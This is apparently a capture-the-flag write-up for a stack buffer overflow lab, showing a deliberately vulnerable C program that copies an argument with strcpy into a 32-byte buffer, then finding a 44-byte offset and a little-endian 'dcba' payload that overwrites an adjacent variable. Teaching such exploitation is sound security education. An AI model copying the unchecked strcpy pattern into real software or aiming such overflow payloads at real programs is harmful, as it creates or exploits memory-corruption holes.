# Code Analysis:

## Code Execution:

```bash
./stack_one                                        
stack_one: You need to provide an argument

./stack_one test                                   
Try again, you have 0x00000000
```

At first glance, the binary retrieves the user input through an execution argument.

## Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[32];

  if(argc == 1) {
      errx(1, "You need to provide an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("Challenge succeeded!\n");
  } else {
      printf("Try again, you have 0x%08x\n", modified);
  }
}
```

1. Execute with a program argument, or it fails.
2. The `modified` variable is initialized to 0.
3. The `buffer` variable of 32 bytes is initialized to the value of the user's input argument.
4. If the `modified` variable has the value `0x61626364`, we succeed in the challenge.

# Exploitation:

## How?

To change the value of `modified` to `0x61626364`, we need to:
- Find from how many argument characters we can reach `modified`.
- Find what equals `0x61626364`.

## Demonstration:

### Finding the Offset

We get something other than `0x00000000` starting from the 45th character:
```bash
./stack_one $(python -c 'print("a" * 44)')         
Try again, you have 0x00000000

./stack_one $(python -c 'print("a" * 45)')
Try again, you have 0x00000061
```

The offset is therefore 44 characters.

> We also notice that the character is added from the right and not from the left of the hexadecimal, it's because of the Little Endian reading.
### Finding `0x61626364`

Thanks to the previous result, we know that `a` equals `61` in hexadecimal, which means that `0x61626364` equals `abcd`. However, the byte order is Little Endian, so we need to provide it in reverse, which is: `dcba`.

### Payload:

```bash
./stack_one $(python -c 'print("a" * 44 + "dcba")')

Challenge succeeded!
```
